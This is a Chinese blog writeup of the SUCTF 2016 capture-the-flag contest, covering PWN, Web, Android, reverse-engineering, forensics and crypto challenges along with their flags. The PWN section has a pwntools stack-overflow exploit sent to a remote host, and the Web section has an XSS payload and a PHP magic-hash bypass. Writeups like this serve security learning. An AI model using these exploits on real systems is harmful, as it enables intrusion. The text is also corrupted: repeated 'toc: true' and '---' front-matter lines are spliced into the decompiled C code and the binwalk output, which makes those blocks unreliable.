title: SUCTF 非官方 Writeup
date: 2016-11-15 19:23:58
categories:
- 乱七八糟
tags:
- CTF
- 脑洞
toc: true

---

又玩了一场 CTF，虽然是个人赛，但是有老司机带我飞。继续开脑洞，也学到了不少，做了很多之前没做过的题。

<!-- more -->

# PWN

## 这是你 hello pwn？

文件在[这里](/suctf/pwn100)。

反编译得到 `main` 和 `getflag` 函数：
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  write(1, "let's begin!\n", 0xDu);
  read(0, &v4, 0x100u);
  return 0;
}
 
//toc: true

----- (0804865D) toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

-----
int getflag()
{
  char format; // [sp+14h] [bp-84h]@4
  char s1; // [sp+28h] [bp-70h]@3
  FILE *v3; // [sp+8Ch] [bp-Ch]@1

  v3 = fopen("flag.txt", "r");
  if ( !v3 )
    exit(0);
  printf("the flag is :");
  puts("SUCTF{dsjwnhfwidsfmsainewmnci}");
  puts("now,this chengxu wil tuichu.........");
  printf("pwn100@test-vm-x86:$");
  __isoc99_scanf("%s", &s1);
  if ( strcmp(&s1, "zhimakaimen") )
    exit(0);
  __isoc99_fscanf(v3, "%s", &format);
  return printf(&format);
}
```

可以看出这个题需要覆盖返回地址，使主函数的返回地址变为 0x0804865D, 跳至 `getflag` 函数, 然后输入 "zhimakaimen" 得到 flag. 编写 payload：
```python
from pwn import *
 
 
r = remote('xxx.xxx.xxx.xxx', 10000)
r.send('A' * 112 + '\x5d\x86\x04\x08')
r.interactive()
```

最后得到 flag: `SUCTF{5tack0verTlow_!S_s0_e4sy}`.

简单的栈溢出攻击，我做的第一道 PWN 题。一开始不知道 pwntool, 用 socket 写了一大堆代码，简直醉人。

# Web

## flag 在哪？
在 Cookie 里。HTTP 响应头带有 `Cookie: flag=suctf%7BThi5_i5_a_baby_w3b%7D` 字段。

## 编码
都说了是编码，找吧。

HTTP 响应头部有 `Password: VmxST1ZtVlZNVFpVVkRBOQ==`，base64 解码**三次**得出 `Su233`，提交至网页得到 flag. 然而网页上的提交按钮是假的:joy:  
好吧，反正表单 method 是 GET，从 URL 里输进去就行了。最后得到 flag: `suctf{Su_is_23333}`

## XSS1
XSS 过滤了 `<script>` 标签。试试 img 吧。  
提交 Payload `<img src=# onerror=alert(1)>`，得到 flag `suctf{too_eaSy_Xss}`.

## PHP 是世界上最好的语言
网页内容为空，查看源码得到 php:  
```php
if(isset($_GET["password"]) && md5($_GET["password"]) == "0")
    echo file_get_contents("/opt/flag.txt");
else
    echo file_get_contents("xedni.php");
```

`MD5 == "0"`，以前做过这道题，找个 MD5 开头是 `0e` 的字符串就行了，比如 `s878926199a`。  
提交得到 flag: `suctf{PHP_!s_the_bEst_1anguage}`.  
尼玛，字符串当数字比，PHP 真是世界上最好的语言啊。

## ( ゜- ゜)つロ 乾杯
给了一长串颜文字，跑个控制台吧，竟然 alert 出一段 `Brainfuck` :new_moon_with_face:  
好吧，找个 AAEncode 解码器，把混淆之前的代码解出来就行了，然后找个 `Brainfuck` 解释器跑一下，得到 flag: `suctf{aAenc0de_and_bra1nf**k}`.

## 你是谁？你从哪里来？
以前做过了，改 HTTP 请求头部的 `Origin` 和 `X-Forwarded-For` 字段即可。得到 flag: `suctf{C0ndrulation!_y0u_f1n1shed}`.

## XSS2
看了别人的 Writeup，麻蛋这竟然是道隐写？把 URL 中的 `xss2.php` 去掉竟然能把目录列出来…里面有个 TIFF 文件，文件里有 flag… 肠子搜悔青了:cry:

# Mobile

## 最基础的安卓逆向题
文件在[这儿](/suctf/SimpleAndroid_apk)。  
先用 `dex2jar` 解出 jar 包，然后用 `jd-gui` 反编译，最后发现 flag 在 `MainActivity` 里：`suctf{Crack_Andr01d+50-3asy}`

## Mob200
[文件](/suctf/CrackMe_apk)。  
反编译以后改代码，把加密过程逆过来，放到安卓系统里跑一下就能出结果。  
然而 Android Studio 跟我有仇… 工程跑不起来，算了。

## mips
[文件](/suctf/mips)。  
找了个在线反编译的网站 <https://retdec.com/decompilation/> 去反编译，得到代码：
```C
#include <stdint.h>
#include <stdio.h>
#include <string.h>
 
char * g1 = "\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a"; // 0x410aa0
 
int main(int argc, char ** argv) {
    int32_t str = 0; // bp-52
    int32_t str2 = 0; // bp-32
    printf("Input Key:");
    scanf("%16s", &str);
    int32_t v1 = 0; // bp-56
    if (strlen((char *)&str) == 0) {
        if (memcmp((char *)&str2, (char *)&g1, 16) == 0) {
            printf("suctf{%s}\r\n", &str);
        } else {
            puts("please reverse me!\r");
        }
        return 0;
    }
    int32_t v2 = 0; // 0x4008148
    int32_t v3 = v2 + (int32_t)&v1; // 0x4007c0
    unsigned char v4 = *(char *)(v3 + 4); // 0x4007c4
    *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2);
    v1++;
    while (v1 < strlen((char *)&str)) {
        v2 = v1;
        v3 = v2 + (int32_t)&v1;
        v4 = *(char *)(v3 + 4);
        *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2);
        v1++;
    }
    if (memcmp((char *)&str2, (char *)&g1, 16) == 0) {
        printf("suctf{%s}\r\n", &str);
    } else {
        puts("please reverse me!\r");
    }
    return 0;
}
```

里面有各种指针操作，不过也不麻烦，啃一下就好啦。

编写解密程序：  
```C
char g[] = "\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a";
 
int main() {
    for (int i = 0; i < strlen(g); i++) {
        printf("%c", g[i] ^ i);
    }
    printf("\n");
}
```
得到 flag: `suctf{X0r_1s_n0t_h4rd}`.

一开始在想，为啥 mips 要放在 Mobile 里？后来想到有些路由器是 mips 架构的，没毛病。

## Mob300
[文件](/suctf/Naive_apk)。  
解压 apk，能看到里面的动态链接库。随便找了个 `x86` 的，反编译出来，在里面找各种常量，最后找到了几段字符串拼起来的 flag: `suctf{Meet_jni_50_fun}`.

这个题也像是逆向…

# Misc

## 签到

Misc 的题最好玩啦。

题目上给了个 QQ 群，加进去，群文件里有 flag.txt.  
`suctf{Welc0me_t0_suCTF}`

## Misc-50
题目给了个 [超大的 GIF](/suctf/Misc-50.gif)，一个长条，看了半天没看出所以然来。  
后来想了想，可能是每一帧拼起来能搞到 flag，于是写了个程序拼了一下。
```python
import os
from PIL import Image
 
 
def analyseImage(path):
    '''
    Pre-process pass over the image to determine the mode (full or additive).
    Necessary as assessing single frames isn't reliable. Need to know the mode 
    before processing all frames.
    '''
    im = Image.open(path)
    results = {
        'size': im.size,
        'mode': 'full',
    }
    try:
        while True:
            if im.tile:
                tile = im.tile[0]
                update_region = tile[1]
                update_region_dimensions = update_region[2:]
                if update_region_dimensions != im.size:
                    results['mode'] = 'partial'
                    break
            im.seek(im.tell() + 1)
    except EOFError:
        pass
    return results
 
 
def processImage(path):
    '''
    Iterate the GIF, extracting each frame.
    '''
    final_img = Image.new('RGBA', (7*71, 750))
    mode = analyseImage(path)['mode']
    
    im = Image.open(path)
 
    i = 0
    p = im.getpalette()
    last_frame = im.convert('RGBA')
    
    try:
        while True:
            if not im.getpalette():
                im.putpalette(p)
            
            new_frame = Image.new('RGBA', im.size)
            if mode == 'partial':
                new_frame.paste(last_frame)
            
            new_frame.paste(im, (0,0), im.convert('RGBA'))
            final_img.paste(new_frame, (7*i, 0))
 
            i += 1
            last_frame = new_frame
            im.seek(im.tell() + 1)
    except EOFError:
        pass

    return final_img
 
 
def main():
    final_img = processImage('Misc-50.gif')
    final_img.save("Misc-50-final.png")
    
 
if __name__ == "__main__":
    main()
```
出来一张图片，里面有 flag: `suctf{t6cV165qUpEnZVY8rX}`

## Forensic-100
下载一个[文件](/suctf/SU), `file` 一下发现是 `gzip` 压缩过的。  
想用 `gzip -d SU` 解压，然而报了一个 `gzip: SU: unknown suffix -- ignored`.  
重命名为 `SU.gz`，然后解压，得到一个 `rot13` 编码的字符串。解密一下：
```python
codecs.encode('fhpgs{CP9PuHsGx#}', 'rot13')
'suctf{PC9ChUfTk#}'
```

关于 `gzip` 解压的问题，还有两种方法：
1. `gunzip -d SU`，`gunzip` 不会管文件名，直接解压后把内容扔到 `stdout` 上。
2. `cat SU | gzip -d`, 用管道把 SU 的    内容输出来。

*小插曲：上面那个 rot13 的字符串里有个井号，会触发 `hexo` 的一个谜之 bug…  
蛋疼。*

## 这不是客服的头像嘛。。。。23333
下载出[一张图片](/suctf/xu.jpg)，一张 jpg，EXIF 看不出名堂，`stegsolve` 也看不出来问题。  
`binwalk` 一下，里面有个压缩包，然后用 `dd` 提出来：

```
$ binwalk xu.jpg
 
DECIMAL         HEX             DESCRIPTIONtoc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

---toc: true

----
46046           0xB3DE          RAR archive data
 
$ dd if=xu.jpg of=xu.rar bs=1 skip=46046
20221+0 records in
20221+0 records out
20221 bytes (20 kB) copied, 0.294344 s, 68.7 kB/s
```

提出来解压，得到一个 `img` 镜像，挂载一下，里面有四张图片，拼起来是个二维码，扫一扫得到 flag: `suctf{bOQXxNoceB}`

## Forensic-250
> Can you fix it?
> Fix the file in the rar
> Tips:Audio

[文件](/suctf/Broken.rar)。

解压出来，发现是一个文本文件：

```
ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74 14 45 50 d8 e3 f9 07 bf c7 …
```

真是丧心病狂，把字节拆出来写到文本文件里:joy:  写个程序转一下。转出来就不知道干什么了… 感觉是个文件头，但是你这个文件头全被 00 刷掉了？这尼玛怎么修:new_moon_with_face:  
然后线索就断了。

# Re

## 先利其器
下载一个[文件](/suctf/use_of_ida_exe)。  
拖进 IDA，找到两段代码：

```C
// ...
if ( num > 9 ) {
    plaintext = 'I';
    flag(&plaintext);
}
// ...
 
signed int __cdecl flag(int *ret) {
    ret[12] = 'a';
    ret[11] = '6';
    ret[10] = 'I';
    ret[9] = '_';
    ret[8] = 'e';
    ret[7] = '5';
    ret[6] = 'U';
    ret[5] = '_';
    ret[4] = 'n';
    ret[3] = '@';
    ret[2] = 'c';
    return 1;
}
```

然后拼起来，flag 里还差个下划线，没看代码，猜出来了：`suctf{I_c@n_U5e_I6a}`

## PE_Format
[文件](/suctf/Do_you_know_pe_exe)。  
不懂 PE 格式，下下来以后看了半天。后来发现出题人竟然把 MZ 头和 PE 头里的 `MZ` 和 `PE` 给调过来了:joy: 改正后，把 MZ 头中 PE 头的位置从 0x40 改到 0x80, 程序就能跑起来了。

拖到 IDA 里反编译，程序竟然是用 C艹 写的…啃代码啃代码，最后发现 flag 被按位非了，写个程序解出来：

```C
#include <stdio.h>
#include <string.h>
 
// char secret[] = "» ¦Š ”‘ˆ ¯º ¹’ž‹À";
char secret[] = "\xBB\x90\xA0\xA6\x90\x8A\xA0\x94\x91\x90\x88\xA0\xAF\xBA\xA0\xB9\x90\x8D\x92\x9E\x8B\xC0";
char v35[40];
 
int main()
{
    char c;
    int len = strlen(secret);
    memset(v35, 0, 30);
    strcpy(v35, secret);
 
    for (int i = 0; i < len; i++)
        v35[i] = ~v35[i];
    printf("%s\n", v35);
    return 0;
}
```
得到 flag: `suctf{Do_You_know_PE_Format?}`.

## Find_correct_path
[文件](/suctf/Which_way_is_correct)。

看源码：
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  char s; // [sp+Ch] [bp-2Ch]@1
  char v5; // [sp+20h] [bp-18h]@1
  int v6; // [sp+28h] [bp-10h]@11
  int v7; // [sp+2Ch] [bp-Ch]@1
 
  v7 = 0;
  memset(&s, 0, 0x14u);
  __isoc99_scanf((const char *)&unk_8048D40, &v5);
  if ( v7 )
  {
    switch ( v7 )
    {
      case 1:
        choose1((int)&s);
        break;
      case 2:
        choose2((int)&s);
        break;
      case 3:
        choose3((int)&s);
        break;
      case 4:
        choose4((int)&s);
        break;
    }
    v6 = strlen(&s);
    final((int)&s, v6);
    result = 0;
  }
  else
  {
    result = 1;
  }
  return result;
}
```
发现程序读入 v5 的值，后面却判断了 v7. 扔到 Linux 下动态调试。

一开始老是报 "No such file or directory", 后来发现没有 `libc6` 链接库。  
然后用 gdb，在 v7 赋值后下断点，改掉 v7 的值，然后让程序继续运行。最后得到 flag: `suctf{Thl5_way_ls_r!8ht}`.

看小伙伴的 Writeup 时，发现 IDA 反编译出的源码是可以在 Linux 中编译的，他直接把源码里的 v5 改成 v7，然后编译一下就出来了。神奇:flushed:

## reverse04
[文件](/suctf/reverse03_exe)。尼玛，为啥题目是 04，文件是 03…

程序里用了各种反动态调试技术，于是我就静态分析了，反正也不会。结果分析了半天，各种算地址，最后算出来的 flag 都有问题，就放弃了…  
据说我只跟 flag 差一个凯撒加密？噫，那天状态真是差。flag: `suctf{antidebugabc}`.

# Crypto

## base??
`MMZVM2TEI5NDOU2WHB4GEM22NRMDCTRRMZIT2PI=` 全大写，根据题目判断应该是 base32. 解出来一段 base64, 再解密得到 flag: `suctf{I_1ove_Su}`.

## 凯撒大帝
OK, 凯撒密码，暴力枚举一下，最后发现有两个字符串拼起来，能得到 `suctf{I_am_Cathar}`.  
然后蛋疼的地方就来了。鼓捣了一晚上，key 各种错，后来同学告诉我说，key 是 `Caesar`… 特么竟然是故意写错的？\_(:зゝ∠)\_

## easyRSA
[文件](/suctf/easyRSA.rar)  
解出来是 RSA 的公钥和加密内容。找了个 [Writeup](http://ohroot.com/2016/07/11/rsa-in-ctf/)，照着做，分解质因数用 `yafu` 搞定，最后得到 flag: `suctf{Rsa_1s_ea5y}`.

## 普莱费尔
> C:prewglqkobbmxgkyzmvyml   
> WW91IGFyZSBsdWNreQ==

Playfair 密码。密钥是后面那个 base64 解出来的。然而，Playfair 的加密矩阵构造方式好像有好多种，所以找了好几个在线解密网站，最后找到 [这个](https://asecuritysite.com/coding/playfair)，把 flag 解出来了：`suctf{charleswheatstone}`

# 总结（说点闲话）
这次 CTF 是个人赛，为期一周，很多题都是在工作日下班之后完成的，所以做题的时候耐心少了一点，很多题半天没做出来就放弃了（比如 Android Studio 那道题）。

博客又很久没更新了，七月到十一月在实习，每天沉迷工(yu)作(le)，没有什么心思去学习、去提高。现在实习结束了，却欠了一堆作业没做。等我把作业都做完，再来更新吧。  
大概会写一篇 Django REST Framework 的入门指南？:flushed:
